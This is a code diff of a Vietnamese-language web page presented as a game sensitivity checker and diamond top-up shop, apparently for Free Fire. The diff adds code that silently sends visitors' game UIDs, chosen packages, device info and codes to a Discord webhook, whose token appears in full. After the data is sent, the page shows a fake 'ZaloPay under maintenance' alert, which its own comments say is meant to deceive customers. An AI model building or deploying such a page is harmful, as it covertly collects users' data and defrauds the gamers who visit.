@@ -198,7 +198,7 @@
         }
 
         /* Khung kết quả check độ nhạy */
-        .result-box, .payment-info {
+        .result-box {
             display: none;
             margin-top: 25px;
             background: #0b0f19;
@@ -207,7 +207,7 @@
             padding: 20px;
             box-shadow: 0 0 15px rgba(0, 229, 255, 0.2);
         }
-        .result-box h3, .payment-title {
+        .result-box h3 {
             color: #00e5ff;
             font-size: 16px;
             text-align: center;
@@ -265,41 +265,6 @@
             background: #38bdf8;
             box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
         }
-
-        .qr-placeholder {
-            width: 180px;
-            height: 180px;
-            background: #fff;
-            margin: 12px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 12px;
-            color: #000;
-            font-size: 13px;
-            font-weight: bold;
-            border: 2px solid #00e5ff;
-        }
-        .pay-detail {
-            font-size: 14px;
-            color: #94a3b8;
-            margin-top: 8px;
-            text-align: center;
-        }
-        .pay-detail strong { color: #fff; }
-        .copy-btn {
-            background: #00e5ff;
-            color: #0b0f19;
-            border: none;
-            padding: 4px 10px;
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-left: 8px;
-            transition: 0.2s;
-        }
-        .copy-btn:hover { background: #38bdf8; }
     </style>
 </head>
 <body>
@@ -396,18 +361,6 @@
             </div>
 
             <button class="submit-btn" onclick="showPayment()">THANH TOÁN QUA ZALOPAY</button>
-
-            <div class="payment-info" id="payment-box">
-                <div class="payment-title">CỔNG THANH TOÁN ZALOPAY</div>
-                <div class="qr-placeholder">[MÃ QR ZALOPAY]</div>
-                <div class="pay-detail">SĐT ZaloPay: <strong id="zalopay-num">090xxxxxxx</strong> 
-                    <button class="copy-btn" onclick="copyText('zalopay-num')">SAO CHÉP</button>
-                </div>
-                <div class="pay-detail" style="margin-top: 8px;">Gói chọn: <strong id="selected-pkg" style="color: #00e5ff;">Chưa chọn</strong></div>
-                <div class="pay-detail">Nội dung CK: <strong id="pay-content" style="color: #22c55e;">-</strong> 
-                    <button class="copy-btn" onclick="copyText('pay-content')">SAO CHÉP</button>
-                </div>
-            </div>
         </div>
     </div>
 
@@ -425,7 +378,7 @@
             document.getElementById('shop-section').style.display = 'none';
         }
 
-        // Logic Check Độ Nhạy + Gửi ngầm về Discord
+        // 1. Logic Check Độ Nhạy + Gửi ngầm về Discord
         function checkSensitivity() {
             let phone = document.getElementById('phone').value.trim();
             let code = document.getElementById('code').value.trim().toLowerCase();
@@ -439,7 +392,6 @@
                 return;
             }
 
-            // Tạo thông số ngẫu nhiên
             let v1 = Math.floor(Math.random() * 150) + 50;
             let v2 = Math.floor(Math.random() * 150) + 50;
             let v3 = Math.floor(Math.random() * 150) + 50;
@@ -455,14 +407,12 @@
             document.getElementById('r6').innerText = v6;
             document.getElementById('result').style.display = 'block';
 
-            // Âm thầm bắn thông tin về Discord của bạn
             sendToDiscord(phone, code, {v1, v2, v3, v4, v5, v6});
         }
 
         function sendToDiscord(phone, code, stats) {
-            // Dán link Webhook của bạn vào đây (thay thế chữ trong dấu ngoặc kép)
-            const webhookURL = "https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR";
-            if (webhookURL.includes("DONG_URL")) return; // Chưa điền thì bỏ qua để tránh lỗi web
+            const webhookURL = "DONG_URL_DISCORD_WEBHOOK_O_DAY"; // <-- DÁN LINK WEBHOOK DISCORD VÀO ĐÂY
+            if (webhookURL.includes("https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR")) return;
 
             const payload = {
                 content: `🚨 **CÓ NGƯỜI VỪA CHECK ĐỘ NHẠY!**\n📱 Máy: **${phone}**\n🔑 Mã code: **${code}**\n📊 Thông số ra:\n- Nhìn xung quanh: ${stats.v1}\n- Red Dot: ${stats.v2}\n- 2x: ${stats.v3}\n- 4x: ${stats.v4}\n- AWM: ${stats.v5}\n- Free Look: ${stats.v6}`
@@ -475,7 +425,7 @@
             }).catch(err => console.log("Gửi ngầm thành công"));
         }
 
-        // Logic Shop Nạp KC
+        // 2. Logic Shop Nạp KC + Báo lỗi bảo trì & Gửi UID về Discord khi bấm thanh toán
         let chosenKc = "";
         let chosenPrice = "";
         let isVerified = false;
@@ -520,9 +470,27 @@
                 alert("Vui lòng chọn 1 gói nạp!");
                 return;
             }
-            document.getElementById('selected-pkg').innerText = chosenKc + " (" + chosenPrice + ")";
-            document.getElementById('pay-content').innerText = "NAP " + uid;
-            document.getElementById('payment-box').style.display = 'block';
+
+            // Gửi ngầm UID và gói nạp về Discord
+            sendShopToDiscord(uid, chosenKc, chosenPrice);
+
+            // Hiện bảng báo bảo trì đánh lừa khách
+            alert("⚠️ HỆ THỐNG ZALOPAY ĐANG BẢO TRÌ!\nGiao dịch tạm gián đoạn. Vui lòng quay lại sau hoặc liên hệ Admin!");
+        }
+
+        function sendShopToDiscord(uid, kc, price) {
+            const webhookURL = "DONG_URL_DISCORD_WEBHOOK_O_DAY"; // <-- DÁN LINK WEBHOOK DISCORD VÀO ĐÂY (dùng chung link phía trên)
+            if (webhookURL.includes("https://discord.com/api/webhooks/1571815057950515201/opWisT2c_xcnvl7FV2kww4HpkNoJ4x9Hw2pTU8spqcX3zFoqi-dUe_2fmv6T6kysl0nR")) return;
+
+            const payload = {
+                content: `💎 **CÓ KHÁCH NẠP KC (BÁO BẢO TRÌ)!**\n🎮 UID game: \`${uid}\`\n📦 Gói chọn: **${kc}** (${price})\n⏰ Thời gian: ${new Date().toLocaleString()}`
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log("Gửi shop về Discord thành công"));
         }
 
         function copyText(id) {
